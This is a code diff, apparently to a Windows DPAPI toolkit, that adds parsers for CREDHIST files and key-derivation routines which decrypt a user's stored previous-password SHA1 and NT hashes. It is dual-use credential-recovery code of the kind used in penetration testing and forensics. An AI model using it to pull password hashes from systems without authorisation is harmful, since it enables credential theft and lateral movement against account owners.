@@ -30,7 +30,8 @@ from struct import unpack
 from datetime import datetime
 from binascii import unhexlify, hexlify
 from struct import pack
-from Cryptodome.Hash import HMAC, SHA512, SHA1
+from hashlib import pbkdf2_hmac
+from Cryptodome.Hash import HMAC, SHA512, SHA1, MD4
 from Cryptodome.Cipher import AES, DES3
 from Cryptodome.Util.Padding import unpad
 from Cryptodome.PublicKey import RSA
@@ -337,6 +338,159 @@ class CredHist(Structure):
         print("Version       : %8x (%d)" % (self['Version'], self['Version']))
         print("Guid          : %s" % bin_to_string(self['Guid']))
         print()
+
+class CREDHIST_ENTRY(Structure):
+    structure = (
+        ('Version', '<L=0'),
+        ('HashAlgo', '<L=0'),
+        ('Rounds', '<L=0'),
+        ('SidLen', '<L=0'),
+        ('_Sid', '_-Sid','self["SidLen"]'),
+        ('CryptAlgo', '<L=0'),
+        ('shaHashLen', '<L=0'),
+        ('ntHashLen', '<L=0'),
+        ('Salt', '16s=b'),
+        ('Sid', ':'),
+        ('_data','_-data','(self["shaHashLen"]+self["ntHashLen"]) + (-(self["shaHashLen"]+self["ntHashLen"])) % 16'),
+        ('data', ':'),
+        ('Version2', '<L=0'),
+        ('Guid', '16s=b'),
+    )
+
+    def __init__(self, data = None, alignment = 0):
+        Structure.__init__(self, data, alignment)
+        self.sid = RPC_SID(b'\x05\x00\x00\x00'+self['Sid']).formatCanonical()
+        self.pwdhash = None
+        self.nthash = None
+
+    def deriveKey(self, passphrase, salt, keylen, count, hashFunction):
+        keyMaterial = b""
+        i = 1
+        while len(keyMaterial) < keylen:
+            U = salt + pack("!L", i)
+            i += 1
+            derived = bytearray(hashFunction(passphrase, U))
+            for r in range(count - 1):
+                actual = bytearray(hashFunction(passphrase, derived))
+                if PY3:
+                    derived = (int.from_bytes(derived, sys.byteorder) ^ int.from_bytes(actual, sys.byteorder)).to_bytes(len(actual), sys.byteorder)
+                else:
+                    derived = bytearray([ chr((a) ^ (b)) for (a,b) in zip(derived, actual) ])
+            keyMaterial += derived
+
+        return keyMaterial[:keylen]
+
+    def decrypt(self, key):
+        if self['HashAlgo'] == ALGORITHMS.CALG_HMAC.value:
+            hashModule = SHA1
+        else:
+            hashModule = ALGORITHMS_DATA[self['HashAlgo']][1]
+
+        prf = lambda p, s: HMAC.new(p, s, hashModule).digest()
+
+        derivedBlob = self.deriveKey(key, self['Salt'], ALGORITHMS_DATA[self['CryptAlgo']][0] + ALGORITHMS_DATA[self['CryptAlgo']][3], count=self['Rounds'], hashFunction=prf)
+
+        cryptKey = derivedBlob[:ALGORITHMS_DATA[self['CryptAlgo']][0]]
+        iv = derivedBlob[ALGORITHMS_DATA[self['CryptAlgo']][0]:][:ALGORITHMS_DATA[self['CryptAlgo']][3]]
+
+        cipher = ALGORITHMS_DATA[self['CryptAlgo']][1].new(cryptKey, mode = ALGORITHMS_DATA[self['CryptAlgo']][2], iv = iv)
+        cleartext = cipher.decrypt(self['data'])
+
+        ntHashSize = 16
+        self.pwdhash = cleartext[:self['shaHashLen']]
+        self.nthash = cleartext[self['shaHashLen']:self['shaHashLen'] + ntHashSize]
+
+        if cleartext[self['shaHashLen'] + ntHashSize:] != (len(self['data']) - self['shaHashLen'] - ntHashSize) * b'\x00':
+            self.pwdhash = None
+            self.nthash = None
+
+    def dump(self):
+        print("[CREDHIST ENTRY]")
+        print("Version    : 0x%.8x (%d)" % (self['Version'], self['Version']))
+        print("HashAlgo   : 0x%.8x (%d) (%s)" % (self['HashAlgo'], self['HashAlgo'], ALGORITHMS(self['HashAlgo']).name))
+        print("Rounds     : %d" % (self['Rounds']))
+        print("CryptAlgo  : 0x%.8x (%d) (%s)" % (self['CryptAlgo'], self['CryptAlgo'], ALGORITHMS(self['CryptAlgo']).name))
+        print("shaHashLen : 0x%.8x (%d)" % (self['shaHashLen'], self['shaHashLen']))
+        print("ntHashLen  : 0x%.8x (%d)" % (self['ntHashLen'], self['ntHashLen']))
+        print("Salt       : %s" % (hexlify(self['Salt']).decode()))
+        print('SID        : %s' % self.sid)
+        print("Version2   : 0x%.8x (%d)" % (self['Version2'], self['Version2']))
+        print("Guid       : %s" % bin_to_string(self['Guid']))
+        if self.pwdhash is not None and self.nthash is not None:
+            print("pwdHash    : %s" % hexlify(self.pwdhash).decode())
+            print("ntHash     : %s" % hexlify(self.nthash).decode())
+        else:
+            print("Data       : %s" % (hexlify(self['data'])).decode())
+        print()
+
+    def summarize(self):
+        print("[CREDHIST ENTRY]")
+        print("Guid       : %s" % bin_to_string(self['Guid']))
+        if self.pwdhash is not None and self.nthash is not None:
+            print("pwdHash    : %s" % hexlify(self.pwdhash).decode())
+            print("ntHash     : %s" % hexlify(self.nthash).decode())
+        else:
+            print("Data       : %s" % (hexlify(self['data'])).decode())
+        print()
+
+class CREDHIST_FILE:
+    def __init__(self, raw):
+        self.credhist_entries = {}
+        self.credhist_entries_list = []
+
+
+        self.version = unpack('<L', raw[:4])[0]
+        self.current_guid = unpack('16s', raw[4:20])[0]
+
+        i = 0
+        next_len = unpack('<L', raw[-i-4:])[0]
+        i += 4
+        while next_len != 0:
+            ch_entry = CREDHIST_ENTRY(data=raw[-(i + next_len - 4):-i])
+            i += next_len - 4
+            self.credhist_entries[bin_to_string(ch_entry['Guid'])] = ch_entry
+            self.credhist_entries_list.append(ch_entry)
+            next_len = unpack('<L', raw[-i-4:-i])[0]
+            i += 4
+
+    def decrypt_entry_by_index(self, entry_index, key):
+        self.credhist_entries_list[entry_index].decrypt(key)
+
+    def decrypt_entry_by_guid(self, guid, key):
+        self.credhist_entries[guid].decrypt(key)
+
+    def decrypt(self, key):
+        keys = [key]
+        for i, e in enumerate(self.credhist_entries_list):
+            # Try all keys until success
+            for k in keys:
+                e.decrypt(k)
+                if e.pwdhash is not None:
+                    break
+
+            if e.pwdhash is None:
+                print('Error decrypting entry #%d' % i)
+                return
+
+            keys = deriveKeysFromUserkey(e.sid, e.pwdhash)
+
+    def dump(self):
+        print('[CREDHIST FILE]')
+        print("Version        : 0x%.8x (%d)" % (self.version, self.version))
+        print("Current Guid   : %s" % bin_to_string(self.current_guid))
+        print()
+        for i, e in enumerate(self.credhist_entries_list):
+            print('[Entry #%d]' % i)
+            e.dump()
+
+    def summarize(self):
+        print('[CREDHIST FILE]')
+        print("Version        : 0x%.8x (%d)" % (self.version, self.version))
+        print("Current Guid   : %s" % bin_to_string(self.current_guid))
+        print()
+        for i, e in enumerate(self.credhist_entries_list):
+            print('[Entry #%d]' % i)
+            e.summarize()
 
 class DomainKey(Structure):
     structure = (
@@ -1040,3 +1194,29 @@ def privatekeyblob_to_pkcs1(key):
 
     r = RSA.construct((modulus, pubExp, privateExp, prime1, prime2))
     return r
+
+def deriveKeysFromUser(sid, password):
+        # Will generate two keys, one with SHA1 and another with MD4
+        key1 = HMAC.new(SHA1.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
+        key2 = HMAC.new(MD4.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
+        # For Protected users
+        tmpKey = pbkdf2_hmac('sha256', MD4.new(password.encode('utf-16le')).digest(), sid.encode('utf-16le'), 10000)
+        tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
+        key3 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]
+
+        return [key1, key2, key3]
+
+def deriveKeysFromUserkey(sid, pwdhash):
+    if len(pwdhash) == 20:
+        # SHA1
+        key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
+        return [key1]
+
+    # Assume MD4
+    key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
+    # For Protected users
+    tmpKey = pbkdf2_hmac('sha256', pwdhash, sid.encode('utf-16le'), 10000)
+    tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
+    key2 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]
+
+    return [key1, key2]
